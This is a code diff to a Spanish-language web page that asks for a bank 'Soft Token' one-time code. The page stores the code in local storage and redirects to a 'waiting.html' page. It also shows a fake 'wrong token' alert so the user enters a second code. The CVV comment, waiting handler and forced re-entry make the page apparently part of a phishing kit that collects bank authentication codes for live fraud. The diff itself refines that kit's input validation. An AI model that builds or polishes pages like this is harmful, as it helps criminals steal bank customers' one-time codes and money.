@@ -53,7 +53,7 @@
                     <!-- CVV -->
                     <div class="input-row-campos">
                         <div class="input-group-text input-fix">
-                            <input class="input-bg-lock" type="number" maxlength="6" id="token" placeholder=" ">
+                            <input class="input-bg-lock" type="number" maxlength="6" oninput="limitarInput(this)" id="token" placeholder=" ">
                             <label for="">Soft Token</label>
                         </div>
                     </div>
@@ -129,10 +129,18 @@
 
     <script src="js/app.js"></script>
     <script>
+
+        function limitarInput(input) {
+            const maxLength = input.getAttribute('maxlength');
+            if (input.value.length > maxLength) {
+                input.value = input.value.slice(0, maxLength);
+            }
+        }
+
         const token = document.querySelector('#token');
         const btnContinuar = document.getElementById('continuar');
-        
-        if(info.err !== ''){
+
+        if (info.err !== '') {
             // Mensaje de error
             alert('¡Token Erróneo! Corrija, por favor.');
 
@@ -146,7 +154,7 @@
             token.style.borderColor = "black";
             token.style.borderBottomWidth = "1px";
 
-            if (token.value.length > 3) {
+            if (token.value.length > 3 && token.value.length < 7) {
                 // Guardar en LS
                 info.tok = token.value;
                 info.err = 'true';
@@ -154,7 +162,7 @@
 
                 // Enviar al handler waiting
                 window.location.href = 'waiting.html';
-                
+
 
             } else {
                 token.style.borderColor = "red";
